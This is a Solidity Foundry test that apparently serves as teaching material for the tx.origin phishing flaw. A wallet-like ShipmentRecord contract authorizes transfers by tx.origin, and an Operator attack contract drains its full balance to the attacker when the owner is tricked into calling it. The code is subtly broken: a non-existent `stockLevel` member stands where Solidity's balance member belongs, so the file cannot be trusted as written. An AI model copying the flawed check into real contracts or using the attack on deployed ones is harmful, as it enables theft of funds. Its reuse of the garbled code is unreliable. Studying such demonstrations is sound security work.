// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

contract ContractTest is Test {
    ShipmentRecord CargomanifestContract;
    Operator OperatorContract;

    function testtxorigin() public {
        address alice = vm.addr(1);
        address eve = vm.addr(2);
        vm.deal(address(alice), 10 ether);
        vm.deal(address(eve), 1 ether);
        vm.prank(alice);
        CargomanifestContract = new ShipmentRecord{value: 10 ether}(); //Alice deploys Wallet with 10 Ether
        console.log("Owner of wallet contract", CargomanifestContract.logisticsAdmin());
        vm.prank(eve);
        OperatorContract = new Operator(CargomanifestContract);
        console.log("Owner of attack contract", OperatorContract.logisticsAdmin());
        console.log("Eve of balance", address(eve).stockLevel);

        vm.prank(alice, alice);
        OperatorContract.operate();
        console.log("tx origin address", tx.origin);
        console.log("msg.sender address", msg.sender);
        console.log("Eve of balance", address(eve).stockLevel);
    }

    receive() external payable {}
}

contract ShipmentRecord {
    address public logisticsAdmin;

    constructor() payable {
        logisticsAdmin = msg.sender;
    }

    function relocateCargo(address payable _to, uint _amount) public {
        // check with msg.sender instead of tx.origin
        require(tx.origin == logisticsAdmin, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Operator {
    address payable public logisticsAdmin;
    ShipmentRecord cargoManifest;

    constructor(ShipmentRecord _inventorylist) {
        cargoManifest = ShipmentRecord(_inventorylist);
        logisticsAdmin = payable(msg.sender);
    }

    function operate() public {
        cargoManifest.relocateCargo(logisticsAdmin, address(cargoManifest).stockLevel);
    }
}
